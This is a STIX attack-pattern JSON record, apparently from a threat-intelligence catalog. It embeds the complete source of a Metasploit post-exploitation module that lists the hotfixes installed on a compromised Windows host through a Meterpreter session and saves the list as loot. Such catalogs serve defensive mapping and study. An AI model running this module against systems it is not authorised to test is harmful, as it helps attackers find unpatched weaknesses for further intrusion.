{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--804ba49d-47ae-4879-9809-f85c8992a948",
    "created": "2024-08-14T16:33:05.026108Z",
    "modified": "2024-08-14T16:33:05.026111Z",
    "name": "Windows Gather Applied Patches",
    "description": " This module enumerates patches applied to a Windows system using the WMI query: SELECT HotFixID, InstalledOn FROM Win32_QuickFixEngineering.  'License' => MSF_LICENSE 'Platform' => ['win'] 'SessionTypes' => ['meterpreter']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_patches.rb",
            "external_id": "enum_patches.rb"
        },
        {
            "source_name": "reference",
            "url": "http://msdn.microsoft.com/en-us/library/aa394391(v=vs.85).aspx"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Common\n  include Msf::Post::Windows::ExtAPI\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Applied Patches',\n        'Description' => %q{\n          This module enumerates patches applied to a Windows system using the\n          WMI query: SELECT HotFixID, InstalledOn FROM Win32_QuickFixEngineering.\n        },\n        'License' => MSF_LICENSE,\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Author' => [\n          'zeroSteiner', # Original idea\n          'mubix' # Post module\n        ],\n        'References' => [\n          ['URL', 'http://msdn.microsoft.com/en-us/library/aa394391(v=vs.85).aspx']\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => []\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              extapi_wmi_query\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def run\n    unless session.commands.include?(Rex::Post::Meterpreter::Extensions::Extapi::COMMAND_ID_EXTAPI_WMI_QUERY)\n      fail_with(Failure::NoTarget, 'Session does not support Meterpreter ExtAPI WMI queries')\n    end\n\n    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']\n    print_status(\"Running module against #{hostname} (#{session.session_host})\")\n\n    begin\n      objects = session.extapi.wmi.query('SELECT HotFixID, InstalledOn FROM Win32_QuickFixEngineering')\n    rescue RuntimeError\n      fail_with(Failure::BadConfig, 'Known bug in WMI query, try migrating to another process')\n    end\n\n    if objects.nil?\n      print_error('Could not retrieve patch information. WMI query returned no data.')\n      return\n    end\n\n    if objects[:values].blank?\n      print_status('Found no patches installed')\n      return\n    end\n\n    results = Rex::Text::Table.new(\n      'Header' => 'Installed Patches',\n      'Indent' => 2,\n      'Columns' =>\n      [\n        'HotFix ID',\n        'Install Date'\n      ]\n    )\n\n    objects[:values].compact.each do |k|\n      results << k\n    end\n\n    if results.rows.empty?\n      print_status(\"No patches were found to be installed on #{hostname} (#{session.session_host})\")\n      return\n    end\n\n    print_line\n    print_line(results.to_s)\n\n    loot_file = store_loot('enum_patches', 'text/plain', session, results.to_csv)\n    print_status(\"Patch list saved to #{loot_file}\")\n  end\nend\n"
}